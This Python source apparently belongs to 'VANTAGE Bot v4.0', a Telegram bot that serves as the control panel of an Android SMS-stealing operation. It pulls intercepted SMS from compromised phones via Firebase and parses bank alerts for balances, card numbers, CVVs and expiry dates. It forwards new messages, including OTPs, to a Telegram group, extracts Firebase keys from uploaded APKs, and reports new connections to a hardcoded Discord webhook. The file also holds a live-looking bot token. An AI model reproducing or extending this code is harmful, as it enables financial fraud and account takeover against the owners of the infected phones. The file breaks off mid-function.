#!/usr/bin/env python3
"""
VANTAGE Bot v4.0 — Final Edition
- Only NEW SMS forwarded (strict timestamp filtering)
- India Standard Time (IST) for all dates
- Web Service port binding fix
- Luxury group messages
- Advanced admin panel
"""

import os
import io
import json
import time
import re
import base64
import asyncio
import logging
import threading
import zipfile
from datetime import datetime, timezone, timedelta
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Optional, Dict, List, Any

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)
from telegram.constants import ParseMode
from telegram.error import RetryAfter, TelegramError

# ============================================
# CONFIG
# ============================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8421885425:AAE2BEwV6zOr0XKEUOaJ4oAm5EygyHJA770")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "6840524720").split(",") if x.strip().isdigit()]

SMS_GROUP_LINK = os.getenv("SMS_GROUP_LINK", "https://t.me/fire_x_otp_group")
SMS_GROUP_ID = os.getenv("SMS_GROUP_ID", "-1003870313704")
CHANNEL_LINK = os.getenv("CHANNEL_LINK", "https://t.me/THE_FIRE_X_NUMBER_CHANNEL")
PORT = int(os.getenv("PORT", "10000"))

DISCORD_WEBHOOKS = [
    "https://discord.com/api/webhooks/1549467602516967585/E-22gt7Ud9ly_DL2xeqa0weVki7f1vxlwmr7xAjUiUP-ENc0hozEj8xUs6ULe5h_6kZS",
]

DATA_FILE = "vantage_bot_data.json"
POLL_INTERVAL = 5
SEND_DELAY = 1.3
MAX_SEND_RETRY = 3

# India Standard Time (UTC+5:30)
IST = timezone(timedelta(hours=5, minutes=30))

# States
(MAIN_MENU, ADD_URL, ADD_KEY, SEND_NUM, SEND_MSG,
 BC_TO, BC_MSG, BC_COUNT) = range(8)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

_send_lock = asyncio.Lock()
_last_send_time = 0


def now_ist() -> datetime:
    """Current India time"""
    return datetime.now(IST)


def now_ist_str() -> str:
    """Formatted India time string"""
    return now_ist().strftime("%d %b %Y, %I:%M:%S %p")


# ============================================
# HEALTH SERVER (Render Web Service)
# ============================================
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"VANTAGE Bot v4.0 OK")
    
    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, *args):
        pass


def start_health_server():
    def _run():
        try:
            server = HTTPServer(("0.0.0.0", PORT), HealthHandler)
            logger.info(f"✅ Health server on port {PORT}")
            server.serve_forever()
        except Exception as e:
            logger.error(f"Health server: {e}")
    threading.Thread(target=_run, daemon=True).start()


# ============================================
# STORAGE
# ============================================
def load_data() -> Dict:
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                d = json.load(f)
                for k in ["accounts", "user_sessions", "locked_users", "seen_msgs", "user_registry"]:
                    d.setdefault(k, {})
                d.setdefault("bot_locked", False)
                d.setdefault("broadcasts_sent", 0)
                return d
        except Exception:
            pass
    return {
        "accounts": {}, "user_sessions": {}, "locked_users": {},
        "bot_locked": False, "seen_msgs": {}, "broadcasts_sent": 0,
        "user_registry": {},
    }


def save_data(data: Dict):
    try:
        tmp = DATA_FILE + ".tmp"
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, DATA_FILE)
    except Exception as e:
        logger.error(f"Save: {e}")


DB = load_data()


def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS


def is_locked(uid: int) -> bool:
    if DB.get("bot_locked") and not is_admin(uid):
        return True
    return str(uid) in DB.get("locked_users", {})


def register_user(uid: int, username: str, name: str):
    reg = DB.setdefault("user_registry", {})
    if str(uid) not in reg:
        reg[str(uid)] = {
            "username": username or "",
            "name": name or "",
            "first_seen": now_ist().isoformat(),
        }
        save_data(DB)


# ============================================
# FIREBASE
# ============================================
async def fb_get(url: str, key: str, path: str, params: Dict = None) -> Optional[Any]:
    base = url.strip().rstrip('/')
    if not base.startswith('http'):
        base = 'https://' + base
    query = {"auth": key.strip(), "_cb": str(int(time.time() * 1000))}
    if params:
        query.update(params)
    qs = '&'.join(f"{k}={v}" for k, v in query.items())
    full = f"{base}/{path}.json?{qs}" if path else f"{base}/.json?{qs}"
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get(full, headers={"Accept": "application/json"}) as r:
                if r.status == 404:
                    return None
                if r.status in (401, 403):
                    raise Exception("PERMISSION_DENIED")
                if not r.ok:
                    t = await r.text()
                    raise Exception(f"HTTP {r.status}: {t[:120]}")
                return await r.json()
    except asyncio.TimeoutError:
        raise Exception("Timeout")
    except aiohttp.ClientError as e:
        raise Exception(f"Network: {e}")


async def fb_put(url: str, key: str, path: str, data: Any) -> bool:
    base = url.strip().rstrip('/')
    if not base.startswith('http'):
        base = 'https://' + base
    full = f"{base}/{path}.json?auth={key.strip()}"
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.put(full, json=data, headers={"Content-Type": "application/json"}) as r:
                return r.ok
    except Exception:
        return False


async def fb_delete(url: str, key: str, path: str) -> bool:
    base = url.strip().rstrip('/')
    if not base.startswith('http'):
        base = 'https://' + base
    full = f"{base}/{path}.json?auth={key.strip()}"
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.delete(full) as r:
                return r.ok
    except Exception:
        return False


# ============================================
# TIMESTAMP PARSER (India Time aware)
# ============================================
def parse_msg_timestamp(time_str: str) -> Optional[float]:
    """Parse message time to Unix timestamp (milliseconds). Returns None if unparseable."""
    if not time_str:
        return None
    
    time_str = str(time_str).strip()
    
    # Try ISO format (Firebase standard)
    try:
        # Handle "2026-10-26T14:30:00.000Z" or similar
        cleaned = time_str.replace('Z', '+00:00')
        dt = datetime.fromisoformat(cleaned)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt.timestamp() * 1000
    except Exception:
        pass
    
    # Try common formats with India time
    formats = [
        "%d/%m/%Y %H:%M:%S",   # 26/10/2026 14:30:00
        "%d/%m/%Y %H:%M",       # 26/10/2026 14:30
        "%d-%m-%Y %H:%M:%S",    # 26-10-2026 14:30:00
        "%d-%m-%Y %H:%M",       # 26-10-2026 14:30
        "%Y-%m-%d %H:%M:%S",    # 2026-10-26 14:30:00
        "%Y-%m-%d %H:%M",       # 2026-10-26 14:30
        "%d %b %Y %H:%M:%S",    # 26 Oct 2026 14:30:00
        "%d %b %Y, %I:%M:%S %p", # 26 Oct 2026, 02:30:00 PM
        "%I:%M:%S %p",          # 02:30:00 PM (today)
        "%d/%m/%Y",             # 26/10/2026 (date only)
    ]
    
    for fmt in formats:
        try:
            dt = datetime.strptime(time_str, fmt)
            if dt.year < 2020:  # Just time, use today's date
                today = now_ist()
                dt = dt.replace(year=today.year, month=today.month, day=today.day)
            # Assume India time
            dt = dt.replace(tzinfo=IST)
            return dt.timestamp() * 1000
        except Exception:
            continue
    
    return None


def get_firebase_key_timestamp(key: str) -> Optional[float]:
    """
    Extract timestamp from Firebase push key.
    Firebase keys are chronological but not directly timestamp.
    If key is numeric (Unix ms), use it.
    """
    if not key:
        return None
    try:
        # If key is numeric timestamp
        if key.isdigit():
            ts = int(key)
            # Could be seconds or ms
            if ts < 10000000000:  # seconds (< year 2286)
                return ts * 1000
            return ts
    except Exception:
        pass
    return None


def format_ist(timestamp_ms: float) -> str:
    """Convert Unix ms to India time string"""
    try:
        dt = datetime.fromtimestamp(timestamp_ms / 1000, tz=IST)
        return dt.strftime("%d %b %Y, %I:%M:%S %p IST")
    except Exception:
        return ""


# ============================================
# PARSERS
# ============================================
BANK_PATTERNS = [
    (r'HDFCBK|HDFCBANK|HDFC', 'HDFC Bank'), (r'SBIIN|SBIINB|SBI', 'SBI'),
    (r'ICICIB|ICICI', 'ICICI Bank'), (r'AXISBK|AXISBANK|AXIS', 'Axis Bank'),
    (r'KOTAKB|KOTAK', 'Kotak'), (r'PNBSMS|PNB', 'PNB'),
    (r'BOIIND|BOI', 'BOI'), (r'CANBNK|CANARA', 'Canara'),
    (r'UNIONB|UBISMS', 'Union'), (r'YESBNK|YESBANK', 'Yes Bank'),
    (r'IDBIBK|IDBI', 'IDBI'), (r'INDUSB|INDUSIND', 'IndusInd'),
    (r'FEDERAL|FEDBNK', 'Federal'), (r'RBLBNK|RBL', 'RBL'),
    (r'PAYTM', 'Paytm'), (r'PHONEPE|PHNPE', 'PhonePe'),
    (r'GPAY|GOOGLEPAY', 'GPay'), (r'AMAZONPAY', 'AmazonPay'),
    (r'BAJAJFIN', 'Bajaj'), (r'CRED', 'CRED'),
    (r'AIRTEL', 'Airtel'), (r'JIOMNY|JIOMONEY', 'JioMoney'),
]

BALANCE_PATTERNS = [
    r'Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)',
    r'Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)',
    r'Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)',
    r'Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)',
]

AMOUNT_PATTERNS = [
    r'(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)',
    r'(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)',
]

ACCOUNT_PATTERNS = [
    r'(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})',
    r'[xX*]{4,}([0-9]{4})', r'ending\s+(?:with\s+)?([0-9]{4})',
]

CARD_PATTERNS = [
    r'(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})',
    r'card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})',
]
CVV_PATTERNS = [r'CVV[\s:]+([0-9]{3,4})', r'(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})']
EXPIRY_PATTERNS = [r'(?:expiry|exp|valid\s+thru?)[\s:]+([0-9]{1,2}\/[0-9]{2,4})']

PHONE_PATTERNS = [
    r'(?:Jio|JIO)\s+(?:Number|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})',
    r'(?:Airtel|AIRTEL)\s+(?:Number|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})',
    r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*([6-9][0-9]{9})',
    r'registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})',
    r'(\+91[-\s]?[6-9][0-9]{9})',
    r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)',
]


def detect_bank(sender: str) -> str:
    for pat, name in BANK_PATTERNS:
        if re.search(pat, sender, re.I):
            return name
    return "Bank"


def parse_bank_sms(text: str, sender: str) -> Optional[Dict]:
    if not text or len(text.strip()) < 8:
        return None
    upper = text.upper()
    if not re.search(r'AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE', upper):
        return None
    balance = None
    for p in BALANCE_PATTERNS:
        m = re.search(p, text, re.I)
        if m and m.group(1):
            try:
                balance = float(m.group(1).replace(',', ''))
                break
            except Exception:
                pass
    if balance is None:
        return None
    amount = None
    for p in AMOUNT_PATTERNS:
        m = re.search(p, text, re.I)
        if m and m.group(1):
            try:
                amount = float(m.group(1).replace(',', ''))
                break
            except Exception:
                pass
    ttype = None
    if re.search(r'credit(?:ed)?', text, re.I):
        ttype = 'credit'
    elif re.search(r'debit(?:ed)?|withdraw|paid|purchase|spent', text, re.I):
        ttype = 'debit'
    acc = None
    for p in ACCOUNT_PATTERNS:
        m = re.search(p, text, re.I)
        if m and m.group(1):
            acc = re.sub(r'[^0-9]', '', m.group(1))[-4:]
            break
    return {
        'bankName': detect_bank(sender),
        'senderName': sender,
        'availableBalance': balance,
        'transactionAmount': amount,
        'transactionType': ttype,
        'accountLast4': acc,
        'rawSms': text,
    }


def parse_card_sms(text: str) -> Optional[Dict]:
    if not text:
        return None
    upper = text.upper()
    if not any(k in upper for k in ['CARD', 'CVV', 'CREDIT', 'DEBIT']):
        return None
    last4 = None
    for p in CARD_PATTERNS:
        m = re.search(p, text, re.I)
        if m and m.group(1):
            d = re.sub(r'[^0-9]', '', m.group(1))
            if len(d) >= 4:
                last4 = d[-4:]
                break
    if not last4:
        return None
    ctype = ''
    if re.search(r'VISA', text, re.I): ctype = 'VISA'
    elif re.search(r'MASTER', text, re.I): ctype = 'Mastercard'
    elif re.search(r'RUPAY', text, re.I): ctype = 'RuPay'
    elif re.search(r'AMEX', text, re.I): ctype = 'Amex'
    elif re.search(r'credit', text, re.I): ctype = 'Credit Card'
    elif re.search(r'debit', text, re.I): ctype = 'Debit Card'
    cvv = None
    for p in CVV_PATTERNS:
        m = re.search(p, text, re.I)
        if m and m.group(1):
            cvv = m.group(1)
            break
    exp = None
    for p in EXPIRY_PATTERNS:
        m = re.search(p, text, re.I)
        if m and m.group(1):
            exp = m.group(1)
            break
    return {'cardLast4': last4, 'cardType': ctype, 'cvv': cvv, 'expiry': exp}


def extract_phones(text: str) -> List[str]:
    found = []
    for p in PHONE_PATTERNS:
        for m in re.finditer(p, text):
            d = re.sub(r'[^0-9]', '', m.group(1))
            if len(d) == 10 and d[0] in '6789':
                found.append(d)
            elif len(d) == 12 and d.startswith('91'):
                found.append(d[2:])
    return list(dict.fromkeys(found))


def parse_messages(raw: Dict) -> List[Dict]:
    msgs = []
    if not raw or not isinstance(raw, dict):
        return msgs
    items = list(raw.items())
    if len(items) > 100:
        items = items[-100:]
    for key, m in items:
        if not isinstance(m, dict):
            continue
        text = str(m.get('message') or m.get('body') or m.get('text') or '')
        if not text.strip():
            continue
        time_str = str(m.get('dateTime') or m.get('date') or m.get('time') or '')
        msgs.append({
            'key': key,
            'text': text,
            'sender': str(m.get('sender') or m.get('from') or 'Unknown'),
            'time_str': time_str,
        })
    msgs.reverse()  # Oldest first
    return msgs


def parse_devices(raw: Dict) -> List[Dict]:
    devices = []
    if not raw or not isinstance(raw, dict):
        return devices
    for dev_id, d in raw.items():
        if not isinstance(d, dict):
            continue
        sims = d.get('sims', [])
        if isinstance(sims, dict):
            sims = list(sims.values())
        elif not isinstance(sims, list):
            sims = []
        battery = str(d.get('battery', '—'))
        try:
            bpct = int(re.sub(r'[^0-9]', '', battery) or '0')
        except Exception:
            bpct = 0
        devices.append({
            'id': dev_id,
            'name': str(d.get('modelName') or d.get('model') or d.get('deviceName') or dev_id),
            'battery': battery,
            'batteryPercent': bpct,
            'status': bool(d.get('status')),
            'phoneNumber': str(d.get('mobNo') or (sims[0].get('phoneNumber') if sims and isinstance(sims[0], dict) else '—')),
            'android': str(d.get('androidV') or d.get('androidVersion') or '—'),
            'ip': str(d.get('ip_address') or '—'),
            'provider': str(d.get('service_provider') or '—'),
            'upipin': str(d['upipin']) if d.get('upipin') else None,
        })
    return devices


# ============================================
# ESCAPE
# ============================================
def esc(t: str) -> str:
    if not t:
        return ""
    out = str(t)
    for ch in ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']:
        out = out.replace(ch, '\\' + ch)
    return out


def esc_code(t: str) -> str:
    if not t:
        return ""
    return str(t).replace('`', "'")[:100]


# ============================================
# FLOOD-SAFE SEND
# ============================================
async def safe_send(app: Application, chat_id, text: str, **kwargs):
    global _last_send_time
    async with _send_lock:
        elapsed = time.time() - _last_send_time
        if elapsed < SEND_DELAY:
            await asyncio.sleep(SEND_DELAY - elapsed)
        
        attempts = 0
        while attempts < MAX_SEND_RETRY:
            attempts += 1
            try:
                msg = await app.bot.send_message(chat_id=chat_id, text=text, **kwargs)
                _last_send_time = time.time()
                return msg
            except RetryAfter as e:
                wait = int(e.retry_after) + 2
                logger.warning(f"Rate limit — waiting {wait}s")
                await asyncio.sleep(wait)
            except TelegramError as e:
                err = str(e)
                if "parse" in err.lower() or "entities" in err.lower():
                    logger.warning("Markdown fail — retry plain")
                    kwargs.pop('parse_mode', None)
                    try:
                        msg = await app.bot.send_message(chat_id=chat_id, text=text, **kwargs)
                        _last_send_time = time.time()
                        return msg
                    except Exception as e2:
                        logger.error(f"Plain fail: {e2}")
                        return None
                logger.error(f"Send error: {e}")
                await asyncio.sleep(2)
        return None


# ============================================
# DISCORD
# ============================================
async def send_discord(url: str, key: str, username: str = "Unknown"):
    try:
        total = 0
        online = 0
        try:
            stats = await fb_get(url, key, "clients")
            if stats and isinstance(stats, dict):
                c = list(stats.values())
                total = len(c)
                online = sum(1 for x in c if isinstance(x, dict) and x.get('status') is True)
        except Exception:
            pass
        embed = {"embeds": [{
            "title": "🔗 New Firebase Connection",
            "color": 0x5865F2,
            "fields": [
                {"name": "📡 URL", "value": url[:100], "inline": False},
                {"name": "👤 User", "value": username, "inline": True},
                {"name": "📊 Total", "value": str(total), "inline": True},
                {"name": "🟢 Online", "value": str(online), "inline": True},
            ],
            "footer": {"text": "VANTAGE"},
            "timestamp": now_ist().isoformat(),
        }]}
        async with aiohttp.ClientSession() as s:
            for wh in DISCORD_WEBHOOKS:
                try:
                    async with s.post(wh, json=embed) as r:
                        await r.text()
                except Exception:
                    pass
    except Exception as e:
        logger.error(f"Discord: {e}")


# ============================================
# ACCOUNTS
# ============================================
def get_accounts(uid: int) -> List[Dict]:
    return DB.get('accounts', {}).get(str(uid), [])


def save_accounts(uid: int, accs: List[Dict]):
    DB.setdefault('accounts', {})[str(uid)] = accs
    save_data(DB)


def get_current(uid: int) -> Optional[Dict]:
    sess = DB.get('user_sessions', {}).get(str(uid))
    if not sess:
        return None
    for a in get_accounts(uid):
        if a.get('id') == sess.get('account_id'):
            return a
    return None


def set_current(uid: int, acc_id: Optional[int]):
    DB.setdefault('user_sessions', {})[str(uid)] = {'account_id': acc_id}
    save_data(DB)


# ============================================
# FETCH
# ============================================
async def fetch_devices_and_msgs(acc: Dict, only_online=True) -> List[Dict]:
    result = []
    try:
        raw = await fb_get(acc['url'], acc['key'], "clients")
        devices = parse_devices(raw)
        for dev in devices:
            if only_online and not dev['status']:
                continue
            try:
                raw_msgs = await fb_get(
                    acc['url'], acc['key'],
                    f"messages/{dev['id']}",
                    {"orderBy": '"$key"', "limitToLast": "50"}
                )
                dev['messages'] = parse_messages(raw_msgs)
            except Exception:
                dev['messages'] = []
            result.append(dev)
    except Exception as e:
        logger.error(f"Fetch: {e}")
    return result


async def fetch_all_online_devices(uid: int) -> List[Dict]:
    all_devs = []
    for acc in get_accounts(uid):
        try:
            devs = await fetch_devices_and_msgs(acc, only_online=True)
            for d in devs:
                d['_account'] = acc['url']
                d['_acc_id'] = acc['id']
            all_devs.extend(devs)
        except Exception:
            pass
    return all_devs


async def fetch_all_numbers(uid: int) -> List[Dict]:
    numbers = {}
    devs = await fetch_all_online_devices(uid)
    for d in devs:
        if d['phoneNumber'] and d['phoneNumber'] != '—':
            num = re.sub(r'[^0-9]', '', d['phoneNumber'])
            if len(num) >= 10:
                numbers[num[-10:]] = {
                    'number': num[-10:],
                    'device': d['name'],
                    'device_id': d['id'],
                    'provider': d['provider'],
                    'battery': d['battery'],
                }
        for m in d.get('messages', []):
            for p in extract_phones(m['text']):
                if p not in numbers:
                    numbers[p] = {
                        'number': p,
                        'device': d['name'],
                        'device_id': d['id'],
                        'provider': d['provider'],
                        'battery': d['battery'],
                    }
    return sorted(numbers.values(), key=lambda x: x['number'])


# ============================================
# APK PARSER
# ============================================
async def parse_apk(file_bytes: bytes) -> Optional[Dict]:
    try:
        firebase_url = None
        api_key = None
        project_id = None
        with zipfile.ZipFile(io.BytesIO(file_bytes)) as zf:
            for name in zf.namelist():
                if 'google-services.json' in name:
                    try:
                        data = json.loads(zf.read(name).decode('utf-8', errors='ignore'))
                        firebase_url = data.get('project_info', {}).get('firebase_url')
                        project_id = data.get('project_info', {}).get('project_id')
                        clients = data.get('client', [])
                        if clients:
                            api_key = clients[0].get('api_key', [{}])[0].get('current_key')
                        if firebase_url:
                            break
                    except Exception:
                        pass
            if not firebase_url or not api_key:
                for name in zf.namelist():
                    if name.endswith('.dex') or name == 'resources.arsc':
                        try:
                            text = zf.read(name).decode('latin-1', errors='ignore')
                            if not firebase_url:
                                m = re.search(r'https://[a-z0-9_-]+\.firebaseio\.com', text)
                                if m:
                                    firebase_url = m.group(0)
                            if not api_key:
                                m = re.search(r'AIza[A-Za-z0-9_-]{35}', text)
                                if m:
                                    api_key = m.group(0)
                            if firebase_url and api_key:
                                break
                        except Exception:
                            pass
        if firebase_url or api_key:
            return {'firebaseUrl': firebase_url, 'apiKey': api_key, 'projectId': project_id}
    except Exception as e:
        logger.error(f"APK: {e}")
    return None


# ============================================
# SMS FORWARDER — STRICT NEW ONLY
# ============================================
FORWARDER_RUNNING = False

# In-memory: ignore any message older than bot start time
BOT_START_TS = time.time() * 1000  # milliseconds


async def initial_sync():
    """
    On startup: mark ALL existing messages as seen.
    Uses BOTH key AND timestamp comparison to prevent old forwards.
    """
    logger.info("🔄 Initial sync — capturing current state...")
    
    DB['seen_msgs'] = {}
    save_data(DB)
    
    all_accounts = DB.get('accounts', {})
    seen = {}
    total_devices = 0
    total_msgs = 0
    
    for uid_str, accs in all_accounts.items():
        for acc in accs:
            try:
                raw = await fb_get(acc['url'], acc['key'], "clients")
                devices = parse_devices(raw)
                
                for dev in devices:
                    total_devices += 1
                    acc_id = f"{acc['url']}|{dev['id']}"
                    
                    try:
                        raw_msgs = await fb_get(
                            acc['url'], acc['key'],
                            f"messages/{dev['id']}",
                            {"orderBy": '"$key"', "limitToLast": "100"}
                        )
                        msgs = parse_messages(raw_msgs)
                        if msgs:
                            seen[acc_id] = {
                                'last_key': msgs[-1]['key'],
                                'last_ts': BOT_START_TS,
                            }
                            total_msgs += len(msgs)
                        else:
                            seen[acc_id] = {
                                'last_key': '',
                                'last_ts': BOT_START_TS,
                            }
                    except Exception as e:
                        logger.error(f"Sync {dev['id']}: {e}")
                        seen[acc_id] = {
                            'last_key': '',
                            'last_ts': BOT_START_TS,
                        }
                    
                    await asyncio.sleep(0.05)
            except Exception as e:
                logger.error(f"Sync acc: {e}")
    
    DB['seen_msgs'] = seen
    save_data(DB)
    logger.info(f"✅ Sync complete — {total_devices} devices, {total_msgs} msgs marked")


async def forward_loop(app: Application):
    global FORWARDER_RUNNING
    FORWARDER_RUNNING = True
    logger.info("📡 SMS Forwarder started (STRICT new-only mode)")
    
    await asyncio.sleep(5)
    await initial_sync()
    
    while FORWARDER_RUNNING:
        try:
            all_accounts = DB.get('accounts', {})
            for uid_str, accs in list(all_accounts.items()):
                for acc in accs:
                    try:
                        devices = await fetch_devices_and_msgs(acc, only_online=True)
                        for dev in devices:
                            acc_id = f"{acc['url']}|{dev['id']}"
                            seen = DB.get('seen_msgs', {})
                            seen_data = seen.get(acc_id)
                            
                            # If no seen data, initialize silently (no forward)
                            if not seen_data:
                                if dev.get('messages'):
                                    seen[acc_id] = {
                                        'last_key': dev['messages'][-1]['key'],
                                        'last_ts': BOT_START_TS,
                                    }
                                    DB['seen_msgs'] = seen
                                    save_data(DB)
                                continue
                            
                            last_key = seen_data.get('last_key', '')
                            last_ts = seen_data.get('last_ts', BOT_START_TS)
                            
                            # STRICT FILTER: only messages with:
                            # 1. key > last_key (newer in Firebase)
                            # 2. AND timestamp > last_ts (newer in real time)
                            new_msgs = []
                            for m in dev.get('messages', []):
                                # Must be strictly newer by key
                                if last_key and m['key'] <= last_key:
                                    continue
                                
                                # Check timestamp if available
                                msg_ts = parse_msg_timestamp(m['time_str'])
                                if msg_ts is not None and msg_ts < last_ts:
                                    # Too old — skip
                                    continue
                                
                                # Check Firebase key timestamp if numeric
                                key_ts = get_firebase_key_timestamp(m['key'])
                                if key_ts is not None and key_ts < BOT_START_TS:
                                    # Created before bot started — skip
                                    continue
                                
                                new_msgs.append(m)
                            
                            # Update seen
                            if dev.get('messages'):
                                latest = dev['messages'][-1]
                                latest_ts = parse_msg_timestamp(latest['time_str'])
                                seen[acc_id] = {
                                    'last_key': latest['key'],
                                    'last_ts': latest_ts if latest_ts else max(last_ts, time.time() * 1000),
                                }
                                DB['seen_msgs'] = seen
                                save_data(DB)
                            
                            # Forward new ones
                            for m in new_msgs:
                                logger.info(f"📨 NEW SMS: {m['sender']} @ {m['time_str']}")
                                await forward_sms_to_group(app, dev, m)
                                await asyncio.sleep(0.8)
                        
                    except Exception as e:
                        logger.error(f"Forward: {e}")
                    await asyncio.sleep(1)
        except Exception as e:
            logger.error(f"Loop: {e}")
        await asyncio.sleep(POLL_INTERVAL)


def build_luxury_sms(dev: Dict, msg: Dict) -> str:
    sender = msg.get('sender', 'Unknown')
    text = msg.get('text', '')
    time_str = msg.get('time_str', '')
    
    # Convert to India time
    msg_ts = parse_msg_timestamp(time_str)
    if msg_ts:
        display_time = format_ist(msg_ts)
    else:
        display_time = time_str or now_ist_str()
    
    phone = dev['phoneNumber']
    if not phone or phone == '—':
        phones = extract_phones(text)
        phone = phones[0] if phones else '—'
    
    bank = parse_bank_sms(text, sender)
    card = parse_card_sms(text)
    
    if card:
        icon, cat = "💳", "CARD"
    elif bank:
        icon, cat = "🏦", "BANK"
    else:
        icon, cat = "📩", "SMS"
    
    lines = [
        "╔══════════════════════",
        f"║ {icon} **{cat} MESSAGE**",
        "╠══════════════════════",
        f"║ 📱 **Device:** {esc(dev['name'][:25])}",
        f"║ 📞 **Number:** `{esc_code(phone)}`",
        f"║ 👤 **From:** `{esc_code(sender)}`",
        f"║ ⏰ **Time:** {esc(display_time)}",
    ]
    if dev.get('provider') and dev['provider'] != '—':
        lines.append(f"║ 🌐 **Network:** {esc(dev['provider'])}")
    if dev.get('battery') and dev['battery'] != '—':
        lines.append(f"║ 🔋 **Battery:** {esc(dev['battery'])}")
    
    lines.append("╠══════════════════════")
    lines.append("║ 💬 **Message:**")
    lines.append("║")
    for line in text[:3500].split('\n'):
        lines.append(f"║ {esc(line)}")
    
    if bank:
        lines.append("╠══════════════════════")
        lines.append(f"║ 💰 **Balance:** ₹{bank['availableBalance']:,.2f}")
        if bank.get('transactionAmount'):
            sign = "＋" if bank['transactionType'] == 'credit' else "－"
            lines.append(f"║ {sign} **Amount:** ₹{bank['transactionAmount']:,.2f}")
            lines.append(f"║ 📊 **Type:** {bank['transactionType'].upper()}")
        if bank.get('accountLast4'):
            lines.append(f"║ 🔢 **A/C:** ****{bank['accountLast4']}")
    
    if card:
        lines.append("╠══════════════════════")
        lines.append(f"║ 💳 **Card:** {esc(card['cardType'] or 'Unknown')}")
        lines.append(f"║ 🔢 **** **** **** {card['cardLast4']}")
        if card.get('cvv'):
            lines.append(f"║ 🔐 **CVV:** `{esc_code(card['cvv'])}`")
        if card.get('expiry'):
            lines.append(f"║ 📅 **Expiry:** {esc(card['expiry'])}")
    
    lines.append("╚══════════════════════")
    lines.append(f"🕐 Forwarded: {now_ist_str()}")
    return "\n".join(lines)


async def forward_sms_to_group(app: Application, dev: Dict, msg: Dict):
    try:
        body = build_luxury_sms(dev, msg)
        kb = InlineKeyboardMarkup([[
            InlineKeyboardButton("📢 Channel", url=CHANNEL_LINK),
            InlineKeyboardButton("👥 SMS Group", url=SMS_GROUP_LINK),
        ]])
        await safe_send(
            app, SMS_GROUP_ID, body,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb,
            disable_web_page_preview=True,
        )
    except Exception as e:
        logger.error(f"Forward error: {e}")


# ============================================
# UI
# ============================================
async def build_admin_menu(uid: int):
    accounts = get_accounts(uid)
    current = get_current(uid)
    
    try:
        devs = await fetch_all_online_devices(uid)
        nums = await fetch_all_numbers(uid)
        online = len(devs)
        total_nums = len(nums)
    except Exception:
        online = 0
        total_nums = 0
    
    bot_locked = DB.get('bot_locked', False)
    locked_count = len(DB.get('locked_users', {}))
    total_users = len(DB.get('user_registry', {}))
    
    text = (
        f"👑 **VANTAGE ADMIN v4.0**\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📡 Accounts: **{len(accounts)}**\n"
        f"🟢 Online Devices: **{online}**\n"
        f"📞 Total Numbers: **{total_nums}**\n"
        f"👥 Total Users: **{total_users}**\n"
        f"🔒 Locked Users: **{locked_count}**\n"
        f"🤖 Bot: {'🔴 LOCKED' if bot_locked else '🟢 Active'}\n"
        f"🕐 {now_ist_str()}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    if current:
        text += f"\n\n✅ `{esc_code(current['url'][:50])}`"
    
    kb = []
    if current:
        kb.append([InlineKeyboardButton("📱 Online Devices", callback_data="admin_devices"),
                   InlineKeyboardButton("📞 All Numbers", callback_data="admin_numbers")])
        kb.append([InlineKeyboardButton("🏦 Bank Info", callback_data="admin_bank"),
                   InlineKeyboardButton("💳 Cards", callback_data="admin_cards")])
